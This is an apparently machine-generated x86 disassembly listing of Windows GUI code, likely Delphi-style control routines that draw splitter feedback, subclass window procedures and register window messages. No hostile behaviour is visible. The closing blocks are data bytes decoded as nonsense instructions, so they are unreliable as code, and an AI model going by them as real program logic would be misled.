cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49532c
call sub_448d2c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_48d62c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_48d5f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_485e14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x269 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_49758c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_485e40
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x277 ] 0x1
mov edx ebx
mov eax esi
call sub_497d08
pop esi
pop ebx
retn
sub_485e94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_497f50
mov [ esi + 0x1ac ] 0x1
mov edx 0x64
mov eax esi
call sub_48d62c
mov dl 0x3
mov eax esi
call sub_48d260
mov edx 0x3
mov eax esi
call sub_48d5f8
mov dx 0xfff2
mov eax esi
call sub_48e1bc
mov [ esi + 0x1c8 ] 0x1e
mov [ esi + 0x1e8 ] 0x3
mov [ esi + 0x1e0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_485f18
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x1b0 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_497fac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_485f48
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_496868
push eax
call GetDCEx
mov [ ebx + 0x1c0 ] eax
cmp [ ebx + 0x1e8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1b0 ]
call sub_46df70
push eax
mov eax [ ebx + 0x1c0 ]
push eax
call SelectObject
mov [ ebx + 0x1e4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dd60
mov esi eax
mov [ ebx + 0x1b0 ] esi
mov edx 0xffffff
xor eax eax
call sub_473a8c
mov edx eax
mov eax esi
call sub_46def0
sub_485fc4
push ebx
add esp 0xfffffff8
mov ebx eax
movzx eax [ ebx + 0x1c4 ]
xor al 0x1
mov [ ebx + 0x1c4 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_432a5c
movzx eax [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ec ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ec ]
mov [ esp ] eax
jmp r-xdata
push 0x5a0049
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x1c0 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_486034
push ebx
mov ebx eax
mov eax [ ebx + 0x1e4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x1c0 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_496868
push eax
call ReleaseDC
mov eax [ ebx + 0x1b0 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x1c0 ]
push eax
call SelectObject
pop ebx
retn
call sub_4481b0
xor eax eax
mov [ ebx + 0x1b0 ] eax
sub_48607c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_432a5c
movzx eax [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_48d81c
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
movzx eax [ esi + 0x5b ]
sub al 0x1
je r-xdata
mov edx esp
lea eax [ esp + 0x8 ]
call sub_432a8c
test al al
jne r-xdata
movzx eax [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_486160
push ebx
mov ebx eax
mov eax ebx
call sub_48d11c
movzx eax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
movzx eax [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_48e1bc
mov dx 0xfff1
mov eax ebx
call sub_48e1bc
jmp r-xdata
pop ebx
retn
sub_4861a0
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x1a0 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x6c ]
call sub_46df1c
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x1a0 ]
call sub_46e300
cmp [ ebx + 0x1ad ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx eax [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x202 ] 0x0
je r-xdata
mov esi [ ebx + 0x1a0 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_46dcf4
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_46dcd8
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_46dc10
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_46e058
mov eax ebx
call sub_48d878
push eax
mov eax ebx
call sub_48d8bc
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_46e440
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
mov eax esp
mov ecx 0x1
mov edx 0x1
call sub_432b28
mov eax 0xff000014
call sub_46cf24
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
push eax
call FrameRect
push esi
call DeleteObject
mov eax esp
mov ecx 0xfffffffe
mov edx 0xfffffffe
call sub_432b28
mov eax 0xff000010
call sub_46cf24
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x1a0 ]
call sub_46e8c8
push eax
call FrameRect
push esi
call DeleteObject
sub_486300
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x1c8 ]
jg r-xdata
cmp [ ebx + 0x1ac ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_486330
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1f2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_48635c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
movzx ecx [ ebp - 0x2 ]
movzx edx [ ebp - 0x1 ]
mov eax ebx
call sub_48fc40
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_48607c
mov [ ebx + 0x1b4 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_432a5c
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1b8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x1bc ] eax
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
movzx eax [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_48d8bc
sub eax [ ebx + 0x1c8 ]
mov [ ebx + 0x1cc ] eax
mov eax [ ebx + 0x30 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_48d878
sub eax [ ebx + 0x1c8 ]
mov [ ebx + 0x1cc ] eax
mov eax [ ebx + 0x30 ]
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x1b4 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x1cc ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x1b4 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x1cc ] eax
jmp r-xdata
inc esi
xor edi edi
movzx eax [ ebx + 0x1e8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x1a8 ] eax
mov edx [ eax + 0x210 ]
mov [ ebx + 0x1d8 ] edx
mov edx [ eax + 0x214 ]
mov [ ebx + 0x1dc ] edx
mov eax [ ebx + 0x1a8 ]
mov [ eax + 0x214 ] ebx
mov [ eax + 0x210 ] sub_486878
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x1cc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_486760
mov eax ebx
call sub_485f48
mov dl 0x1
mov eax ebx
call sub_477038
mov edx eax
mov ecx [ edx + 0x278 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_485fc4
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4924f8
movzx edx [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4924f8
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x1cc ] eax
sub_486508
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1e0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
call sub_48d62c
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1fa ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_492038
xor edx edx
push ebp
push sub_486645
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x1d0 ]
add edx [ eax + 0x44 ]
call sub_48d5c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1d0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
call sub_48d62c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_492040
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1e0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
call sub_48d5f8
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_492038
xor edx edx
push ebp
push sub_4865d8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x1d0 ]
add edx [ eax + 0x40 ]
call sub_48d590
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1d0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
call sub_48d5f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_492040
retn
jmp r-xdata
sub_48668c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
movzx edx [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x1bc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x1b8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x1b4 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x1c8 ]
jge r-xdata
mov eax [ esi + 0x1b4 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x1cc ]
jle r-xdata
mov ecx [ esi + 0x1c8 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x1b4 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x1cc ]
mov [ edi ] ecx
mov eax [ esi + 0x1b4 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_486778
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
movzx edx [ ebp - 0x1 ]
mov eax ebx
call sub_48ff08
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_48668c
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x98 ]
test al al
je r-xdata
movzx eax [ ebx + 0x1e8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_485fc4
sub al 0x2
jne r-xdata
movzx eax [ ebx + 0x1e8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_486508
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x1d0 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ec ] eax
cmp [ ebx + 0x1e8 ] 0x2
jne r-xdata
mov eax ebx
call sub_485fc4
sub al 0x2
jne r-xdata
sub_486824
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
movzx ecx [ ebp - 0x1 ]
mov eax esi
call sub_48ffb4
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
movzx eax [ esi + 0x1e8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_485fc4
sub al 0x2
jne r-xdata
mov eax esi
call sub_486508
mov eax esi
mov si 0xffc6
call sub_4483f8
sub_486878
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x1da ] 0x0
je r-xdata
mov eax esi
mov si 0xffc6
call sub_4483f8
jmp r-xdata
pop esi
pop ebp
retn 0x4
movzx eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x1dc ]
call [ esi + 0x1d8 ]
sub_4868c4
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
cmp [ ebx + 0x1fa ] 0x0
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
xor eax eax
mov [ ebx + 0x1b4 ] eax
mov eax ebx
call sub_486034
mov eax [ ebx + 0x1a8 ]
test eax eax
je r-xdata
mov eax ebx
call sub_485fc4
mov edx [ ebx + 0x1d8 ]
mov [ eax + 0x210 ] edx
mov edx [ ebx + 0x1dc ]
mov [ eax + 0x214 ] edx
xor eax eax
mov [ ebx + 0x1a8 ] eax
sub_486934
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_486959
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486960
retn
sub_486b34
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
retn
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_483c04
retn
sub_486b6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e278
mov [ esi + 0x30 ] 0x1
push esi
push sub_486ca0
call sub_42f338
mov [ esi + 0x5c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_486bb4
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
call sub_42f3d0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x260 ] edx
lea eax [ esi + 0x3c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_486c04
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xcc ] 0x0
je r-xdata
call sub_486b34
mov eax [ rw-data ]
mov eax [ eax ]
call sub_483bb8
test eax eax
jne r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
pop esi
retn
call sub_486b34
jmp r-xdata
sub_486c40
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x34 ]
xchg edx eax
call sub_482c20
mov cl 0x1
sub_486c68
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x38 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_448460
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x58 ]
push eax
call CallWindowProcW
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_486ca0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_486cca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_486d3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_483bb8
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_476b80
mov [ ebp - 0x18 ] eax
call sub_4769d4
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_486ded
push [ fs : ecx ]
mov [ fs : ecx ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_486dac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486db3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_486db3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486df4
mov eax [ ebp - 0x18 ]
call sub_476c44
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x14 ]
call sub_4769dc
mov eax [ ebp - 0x8 ]
add eax 0x3c
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
retn
sub_486f4c
add esp 0xffffffb0
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] 0x0
lea ecx [ esp + 0x44 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_4364b8
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
add esp 0x50
retn
sub_487049
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
pop esp
and ecx [ esi ]
[ esi ] ecx
add [ eax ] al
add [ eax ] al
pop eax
and ecx [ esi ]
in al dx
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
push esp
and ecx [ esi ]
call sub_48bef8
add [ eax ] al
add [ eax + 0x23 ] dl
dec esi
add ah ah
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
dec esp
and ecx [ esi ]
fadd [ edi + 0x4e ]
add [ eax ] al
dec eax
and ecx [ esi ]
fadd [ edi + 0x4e ]
add [ eax ] al
inc esp
and ecx [ esi ]
aam 0x87
dec esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] al
dec esi
add al dl
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
cmp [ ebx ] ah
dec esi
add ah cl
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
xor al 0x23
dec esi
add al cl
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
xor [ ebx ] ah
dec esi
add ah al
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
sub al 0x23
dec esi
add al al
xchg [ esi ] ecx
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_487133
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48713a
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_44a7e8
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_48713c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_44900c
call sub_486f4c
mov eax [ r-xdata ]
call sub_423d34
mov eax [ r-xdata ]
call sub_423dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
sub_48717c
xor [ ecx + 0x48 ] 0x0
add [ esp + edx * 2 ] ecx
dec ebp
outsd
popad
insb
push edx
jae r-xdata
insb
dec esp
je r-xdata
insb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add [ eax ] al
add [ eax + 0x7fffffff ] al
nop
pushfd
jno r-xdata
sbb [ edi - 0x516fffb8 ] ch
dec eax
add al dh
je r-xdata
add [ eax ] al
shl [ ecx + 0x48 ] 0x1
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 4 + 0x72 ] si
dec eax
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 4 + 0x72 ] si
dec eax
add [ eax + 0x57 ] al
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
scasb [ edi ]
dec eax
add [ eax + esi * 4 + 0x48 ] ah
add [ eax - 0x50 ] ch
dec eax
add [ eax - 0x50 ] dh
dec eax
add [ ebx ] cl
push esp
inc esp
jb r-xdata
dec eax
add [ eax ] bl
scasd [ edi ]
dec eax
add [ eax - 0xfffb752 ] dl
insd
push es
popad
popad
insb
inc edx
outsd
je r-xdata
outsb
je r-xdata
jae r-xdata
add al dh
scasb [ edi ]
dec eax
add [ eax + esi * 4 + 0x48 ] ah
add [ eax - 0x50 ] ch
dec eax
add [ eax - 0x50 ] dh
dec eax
add [ ecx + esi * 4 + 0x48 ] cl
add ah ah
mov al 0x48
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax + eax ] cl
add [ edx + esi * 2 ] ch
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add al dl
mov al 0x48
